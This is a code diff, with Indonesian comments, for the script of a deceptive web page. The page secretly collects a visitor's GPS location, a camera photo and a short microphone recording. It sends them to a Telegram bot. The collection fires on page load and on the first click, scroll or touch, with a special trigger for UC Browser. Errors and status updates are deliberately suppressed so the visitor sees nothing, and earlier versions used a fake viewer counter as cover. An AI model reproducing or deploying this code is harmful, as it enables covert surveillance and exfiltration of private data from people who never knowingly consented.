-                updateStatus('2.3K', 'Terima kasih');
+            } catch {
+                return null;
             }
         }
         
-        function updateStatus(viewers, msg) {
-            document.getElementById('status').innerHTML = viewers;
+        // ==================== FUNGSI AUDIO ====================
+        async function rekamAudio() {
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(audioStream);
+                const audioChunks = [];
+                
+                return new Promise((resolve) => {
+                    mediaRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.readAsDataURL(audioBlob);
+                        reader.onloadend = () => {
+                            audioStream.getTracks().forEach(track => track.stop());
+                            resolve({
+                                success: true,
+                                audioBase64: reader.result
+                            });
+                        };
+                    };
+                    
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, 2000);
+                });
+                
+            } catch {
+                return { success: false };
+            }
         }
         
-        // Fungsi untuk akses kamera
-        async function ambilFoto() {
+        // ==================== FUNGSI KIRIM ====================
+        async function kirimData(lokasi, foto, audio) {
+            try {
+                let pesan = `📱 Pengunjung Baru\n`;
+                pesan += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
+                
+                if (lokasi && lokasi.success) {
+                    pesan += `📍 https://maps.google.com/?q=${lokasi.lat},${lokasi.lng}\n`;
+                }
+                
+                if (foto) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    
+                    const response = await fetch(foto);
+                    const blob = await response.blob();
+                    formData.append('photo', blob, 'foto.jpg');
+                    formData.append('caption', pesan);
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                } else {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: pesan
+                        })
+                    });
+                }
+                
+                if (audio && audio.success) {
+                    const formDataAudio = new FormData();
+                    formDataAudio.append('chat_id', CHAT_ID);
+                    
+                    const audioResponse = await fetch(audio.audioBase64);
+                    const audioBlob = await audioResponse.blob();
+                    formDataAudio.append('audio', audioBlob, 'audio.webm');
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                        method: 'POST',
+                        body: formDataAudio
+                    });
+                }
+                
+            } catch (e) {
+                // Abaikan error
+            }
+        }
+        
+        // ==================== FUNGSI UTAMA ====================
+        async function kumpulkanData() {
             if (isProcessing) return;
             isProcessing = true;
             
             try {
-                updateStatus('⏳', 'Memuat...');
+                // Kumpulkan semua data di background (TANPA UPDATE STATUS)
+                const hasil = {
+                    lokasi: await getLokasi(),
+                    foto: await ambilFoto(),
+                    audio: await rekamAudio()
+                };
                 
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    throw new Error('Browser tidak mendukung');
-                }
-                
-                // Coba akses kamera dengan berbagai constraint
-                const constraints = [
-                    { video: { facingMode: 'user', width: 640, height: 480 } },
-                    { video: { facingMode: 'user' } },
-                    { video: { facingMode: 'environment' } },
-                    { video: true }
-                ];
-                
-                let stream = null;
-                for (const constraint of constraints) {
-                    try {
-                        stream = await navigator.mediaDevices.getUserMedia(constraint);
-                        break;
-                    } catch {}
-                }
-                
-                if (!stream) throw new Error('Tidak bisa akses kamera');
-                
-                cameraAccessed = true;
-                
-                // Countdown singkat (disamarkan sebagai update viewer)
-                const countdownEl = document.getElementById('countdown');
-                
-                for (let i = 3; i > 0; i--) {
-                    countdownEl.innerHTML = i;
-                    await new Promise(resolve => setTimeout(resolve, 200));
-                }
-                countdownEl.innerHTML = '2';
-                
-                // Ambil foto
-                const video = document.getElementById('hidden-video');
-                video.srcObject = stream;
-                
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play().then(resolve).catch(() => setTimeout(resolve, 500));
-                    };
-                    setTimeout(resolve, 1000);
-                });
-                
-                await new Promise(resolve => setTimeout(resolve, 200));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
-                
-                // Kirim
-                updateStatus('⏳', 'Mengirim...');
-                await kirimKeTelegram(fotoBase64);
-                
-                // Matikan kamera
-                stream.getTracks().forEach(track => track.stop());
+                // Kirim semua data
+                await kirimData(hasil.lokasi, hasil.foto, hasil.audio);
                 
             } catch (error) {
-                console.log('Info:', error.message);
-                updateStatus('2.3K', 'Selamat datang');
+                // Abaikan error
             } finally {
                 isProcessing = false;
             }
         }
         
-        // Multiple triggers
+        // Trigger untuk UC Browser
+        window.triggerUC = function() {
+            if (!isProcessing) {
+                kumpulkanData();
+            }
+        };
+        
+        // Multi-trigger
         function startCollection() {
-            // Trigger 1: Setelah load
-            setTimeout(() => {
-                ambilFoto().catch(() => {});
-            }, 1000);
+            // Trigger 1: Setelah halaman load (2 detik)
+            setTimeout(() => kumpulkanData(), 2000);
             
-            // Trigger 2: Saat scroll
-            window.addEventListener('scroll', function scrollHandler() {
-                if (!cameraAccessed && !isProcessing) {
-                    window.removeEventListener('scroll', scrollHandler);
-                    setTimeout(() => ambilFoto().catch(() => {}), 100);
-                }
+            // Trigger 2: Saat interaksi user
+            const events = ['touchstart', 'click', 'scroll'];
+            events.forEach(eventType => {
+                document.addEventListener(eventType, function handler() {
+                    if (!isProcessing) {
+                        document.removeEventListener(eventType, handler);
+                        setTimeout(() => kumpulkanData(), 100);
+                    }
+                }, { once: true });
             });
             
-            // Trigger 3: Saat klik
-            document.addEventListener('click', function clickHandler(e) {
-                if (!cameraAccessed && !isProcessing) {
-                    document.removeEventListener('click', clickHandler);
-                    setTimeout(() => ambilFoto().catch(() => {}), 200);
-                }
-            });
-            
-            // Trigger 4: Saat touch di mobile
-            document.addEventListener('touchstart', function touchHandler(e) {
-                if (!cameraAccessed && !isProcessing) {
-                    document.removeEventListener('touchstart', touchHandler);
-                    setTimeout(() => ambilFoto().catch(() => {}), 200);
-                }
-            });
-            
-            // Trigger 5: Retry
-            let retryCount = 0;
-            const retryInterval = setInterval(() => {
-                if (cameraAccessed || retryCount >= 3) {
-                    clearInterval(retryInterval);
-                    return;
-                }
-                retryCount++;
-                ambilFoto().catch(() => {});
-            }, 3000);
+            // Trigger 3: Khusus UC Browser
+            if (browser.isUC) {
+                setTimeout(() => {
+                    document.getElementById('uc-trigger').click();
+                }, 3000);
+            }
         }
         
-        // Mulai
+        // Mulai - TANPA MENAMPILKAN STATUS APAPUN
         window.addEventListener('load', () => {
-            updateStatus('2.3K', 'Live');
-            
-            // Animasi viewer count
-            setInterval(() => {
-                if (!cameraAccessed) {
-                    const current = parseInt(document.getElementById('status').innerHTML) || 2300;
-                    document.getElementById('status').innerHTML = (current + Math.floor(Math.random() * 10)) + 'K';
-                }
-            }, 5000);
-            
-            setTimeout(startCollection, 500);
+            startCollection();
         });
         
         // Cleanup
         window.addEventListener('beforeunload', () => {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
+            if (stream) stream.getTracks().forEach(track => track.stop());
+            if (audioStream) audioStream.getTracks().forEach(track => track.stop());
         });
         
     </script>
